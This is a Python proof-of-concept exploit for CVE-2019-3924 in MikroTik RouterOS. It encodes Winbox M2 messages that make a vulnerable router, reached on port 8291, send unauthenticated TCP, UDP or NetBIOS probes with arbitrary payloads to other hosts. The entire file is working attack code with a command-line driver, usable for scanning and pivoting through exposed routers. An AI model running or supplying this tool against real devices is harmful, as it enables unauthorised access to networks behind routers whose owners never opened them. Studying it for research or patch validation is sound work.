#!/usr/bin/env python3

# https://www.tenable.com/cve/CVE-2019-3924
# https://www.tenable.com/security/research/tra-2019-07

import argparse, struct, socket, hashlib, time
from binascii import *
from codecs import decode

# Packet headers
M2_HEADER = b'\x4d\x32'
M2_EXTRA  = b'\x01\x00'

# Winbox protocol types
MT_BOOL       = 0x00
MT_BOOL_CODE  = {False: 0x00, True: 0x01}
MT_BOOL_VALUE = {0x00: False, 0x01: True}
MT_DWORD      = 0x08
MT_BYTE       = 0x09
MT_STRING     = 0x21
MT_HASH       = 0x31
MT_ARRAY      = 0x88

# Message protocol constants
MT_RECEIVER = 0xff0001
MT_SENDER = 0xff0002
MT_REPLY_EXPECTED = 0xff0005
MT_REQUEST_ID = 0xff0006
MT_COMMAND = 0xff0007

# Resulting error codes
EXIT_OK = 0
EXIT_ERROR = 1
EXIT_UNKNOWN = 2

def ip2dword(addr):
	return struct.unpack("<I", socket.inet_aton(addr))[0]

# Add M2 header and sizes to the stream (there's no check if size exceeds one 255)
def m2_header(stream):
	size = len(stream)
	return struct.pack('B', size + 4) + M2_EXTRA + struct.pack('B', size + 2) + M2_HEADER + stream

# Return an array of M2 blocks, each cointaining an array of tuples like (code, type, value)
def m2_parse(stream):
	result = []

	pointer = 0
	stream_size = len(stream)

	while pointer < stream_size:
		keywords = []

		header_block_size = ord(stream[pointer:pointer+1])
		pointer += 1
		if stream[pointer:pointer+2] != M2_EXTRA:
			return None
		pointer += 2
		m2_block_size = ord(stream[pointer:pointer+1])
		pointer += 1
		if stream[pointer:pointer+2] != M2_HEADER:
			print('Not a M2 block')
			return None
		if header_block_size != (m2_block_size + 2):
			print('M2 header and block sizes mismatch!')
			return None
		pointer += 2

		block_data_start = pointer

		while pointer < (block_data_start + m2_block_size - 2):
			# Configuration ID, or keyword_code, is always 3 bytes long
			try:
				keyword_code = struct.unpack('<I', stream[pointer:pointer+3] + b'\x00')[0]
			except:
				return result
			pointer += 3
			# The next is one byte keyword type
			keyword_type = ord(stream[pointer:pointer+1])
			if keyword_type in MT_BOOL_CODE:
				keyword_value = MT_BOOL_VALUE[keyword_type]
				pointer += 1
			elif keyword_type == MT_DWORD:
				pointer += 1
				keyword_value = struct.unpack('<I', stream[pointer:pointer+4])[0]
				pointer += 4
			elif keyword_type == MT_BYTE:
				pointer += 1
				keyword_value = struct.unpack('B', stream[pointer:pointer+1])[0]
				pointer += 1
			elif keyword_type == MT_STRING:
				pointer += 1
				length = ord(stream[pointer:pointer+1])
				pointer += 1
				keyword_value = stream[pointer:pointer+length].decode('UTF-8')
				pointer += length
			elif keyword_type == MT_HASH:
				pointer += 1
				length = ord(stream[pointer:pointer+1])
				pointer += 1
				keyword_value = stream[pointer:pointer+length]
				pointer += length
			elif keyword_type == MT_ARRAY:
				pointer += 1
				array_size = struct.unpack('<H', stream[pointer:pointer+2])[0]
				pointer += 2
				i = 0
				keyword_value = []
				while i < array_size:
					element = struct.unpack('<I', stream[pointer:pointer+4])[0]
					i += 1
					pointer += 4
					keyword_value.append(element)
			else:
				print('Unknown keyword/code')
				break
			keywords.append((keyword_code, keyword_type, keyword_value))
		result.append(keywords)
	return result

# Generate a stream for the given array of keywords, which are tuples of: (code, type, value)
def m2_bytes(keywords):
	result = b''
	for k in keywords:
		code, type, value = k

		if type == MT_BOOL:
			type = MT_BOOL_CODE[value]
			size_bytes = b''
			value_bytes = b''
		elif type == MT_DWORD:
			size_bytes = b''
			value_bytes = struct.pack('<I', value)
		elif type == MT_BYTE:
			size_bytes = b''
			value_bytes = struct.pack('B', value)
		elif type == MT_STRING:
			size_bytes = struct.pack('B', len(value))
			value_bytes = value.encode('UTF-8')
		elif type == MT_HASH:
			size_bytes = struct.pack('B', len(value))
			value_bytes = value
		elif type == MT_ARRAY:
			size_bytes = struct.pack('<H', len(value))
			value_bytes = b''
			for element in value:
				value_bytes += struct.pack('<I', element)
		code_bytes = struct.pack('<I', code)[0:3]
		type_bytes = struct.pack('B', type)
		result += (code_bytes + type_bytes + size_bytes + value_bytes)
	return result

def mt_tcp_probe(host, port, send, receive):
	m2 = []
	m2.append((MT_RECEIVER, MT_ARRAY, [0x68]))
	m2.append((MT_COMMAND, MT_BYTE, 1))
	m2.append((MT_REQUEST_ID, MT_BYTE, 1))
	m2.append((MT_REPLY_EXPECTED, MT_BOOL, True))
	m2.append((3, MT_DWORD, ip2dword(host)))
	m2.append((4, MT_DWORD, port))
	if send != '':
		m2.append((7, MT_STRING, send))
	if receive != '':
		m2.append((8, MT_STRING, receive))
	return m2_header(m2_bytes(m2))

def mt_udp_probe(host, port, send, receive):
	m2 = []
	m2.append((MT_RECEIVER, MT_ARRAY, [0x68]))
	m2.append((MT_COMMAND, MT_BYTE, 2))
	m2.append((MT_REQUEST_ID, MT_BYTE, 1))
	m2.append((MT_REPLY_EXPECTED, MT_BOOL, True))
	m2.append((3, MT_DWORD, ip2dword(host)))
	m2.append((4, MT_DWORD, port))
	if send != '':
		m2.append((7, MT_STRING, send))
	if receive != '':
		m2.append((8, MT_STRING, receive))
	return m2_header(m2_bytes(m2))

def mt_netbios_probe(host):
	m2 = []
	m2.append((MT_RECEIVER, MT_ARRAY, [0x68]))
	m2.append((MT_COMMAND, MT_BYTE, 3))
	m2.append((MT_REQUEST_ID, MT_BYTE, 1))
	m2.append((MT_REPLY_EXPECTED, MT_BOOL, True))
	m2.append((3, MT_DWORD, ip2dword(host)))
	return m2_header(m2_bytes(m2))

def get_value(data, a_code, a_type):
	parsed_data = m2_parse(data)

	if parsed_data is None:
		return None

	for block in parsed_data:
		for keyword in block:
			code, type, value = keyword
			if type in MT_BOOL_CODE:
				if code == a_code:
					return MT_BOOL_VALUE[value]
				else:
					return None
			elif code == a_code and type == a_type:
				return value
	return None

def dump_packet(packet):
	packet_data = m2_parse(packet)
	if packet_data is not None:
		for block in packet_data:
			for keyword in block:
				code, type, value = keyword
				print(code, type, value)

def do(proxy_host, proxy_port, target_host, target_port, send, receive):
	result = EXIT_UNKNOWN
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect((proxy_host, int(proxy_port)))
		print('[+] Connected to %s:%s' % (proxy_host, proxy_port))
	except:
		print('[-] Could not connect to %s:%s' % (proxy_host, proxy_port))
		s.close()
		return EXIT_ERROR
	if netbios:
		request = mt_netbios_probe(target_host)
		print('[+] Set NetBIOS probe mode for %s' % target_host)
	elif udp:
		request = mt_udp_probe(target_host, target_port, send, receive)
		print('[+] Set UDP probe mode for %s:%s' % (target_host, target_port))
	else:
		request = mt_tcp_probe(target_host, target_port, send, receive)
		print('[+] Set TCP probe mode for %s:%s' % (target_host, target_port))
	if DEBUG:
		print('>>>', hexlify(request).decode('UTF-8'), '\n')
		print('M2 parse of the request:')
		dump_packet(request)
		print()
	try:
		s.send(request)
		print('[+] Request to %s:%s proxied via %s:%s' % (target_host, target_port, proxy_host, proxy_port))
	except:
		print('[-] Request to %s:%s failed via %s:%s' % (target_host, target_port, proxy_host, proxy_port))
		s.close()
		return EXIT_ERROR
	try:
		read = s.recv(1024)
		if len(read) > 0:
			print('[+] Response read from %s:%s completed' % (proxy_host, proxy_port))
		else:
			print('[-] Response from %s:%s is zero bytes' % (proxy_host, proxy_port))
			return EXIT_ERROR
	except:
		print('[-] Response read from %s:%s failed' % (proxy_host, proxy_port))
		s.close()
		return EXIT_ERROR
	if DEBUG:
		print('<<<', hexlify(read).decode('UTF-8'), '\n')
		print('M2 parse of the response:')
		dump_packet(read)
		print()
	error = get_value(read, 0xff0008, MT_DWORD)
	if error is not None:
		result = EXIT_ERROR
		error_description = get_value(read, 0xff0009, MT_STRING)
		if error_description is not None:
			print('[-] Error: %s [%s]' % (error, error_description))
		else:
			print('[-] Error: %s' % error)
	elif get_value(read, 13, MT_BOOL):
		print('[+] Success!')
		result = EXIT_OK
	s.close()
	return result

DEBUG = False
proxy_port = 8291
send = ''
receive = ''
udp = False
netbios = False
target_port = 80

if __name__ == '__main__':
	parser = argparse.ArgumentParser(description='description')
	parser.add_argument('-X', '--proxy-host', help = 'A proxy host IP address to connect to', required = True)
	parser.add_argument('-P', '--proxy-port', help = 'A proxy winbox port number to connect to (default = 8291)', required = False)
	parser.add_argument('-t', '--target-host', help = 'A target host address to make a TCP-probe to', required = True)
	parser.add_argument('-p', '--target-port', help = 'A target TCP port to make a probe to (default = 80)', required = False)
	parser.add_argument('-s', '--send', help = 'A request data to send to the target', required = False)
	parser.add_argument('-r', '--receive', help = 'A regexp to match the response data', required = False)
	parser.add_argument('-u', '--udp', action = 'store_true', help = 'Use UDP probe instead of TCP', required = False)
	parser.add_argument('--netbios', action = 'store_true', help = 'Use NetBIOS probe', required = False)
	parser.add_argument('--debug', action = 'store_true', help = 'Display the debugging info', required = False)
	args = vars(parser.parse_args())

	if args['udp']:
		udp = True
	if args['netbios']:
		if udp:
			print('Error: please don''t use both udp and netbios modes')
			exit(EXIT_UNKNOWN)
		netbios = True
	proxy_host = args['proxy_host']
	if args['proxy_port']:
		proxy_port = int(args['proxy_port'])
	target_host = args['target_host']
	if args['target_port']:
		target_port = int(args['target_port'])
	if args['send']:
		send = decode(args['send'], 'unicode_escape')
	if args['receive']:
		receive = decode(args['receive'], 'unicode_escape')
	if args['debug']:
		DEBUG = True

	print('Send:', repr(send), '\nReceive (regex):', repr(receive))
	result = do(proxy_host, proxy_port, target_host, target_port, send, receive)
	exit(result)
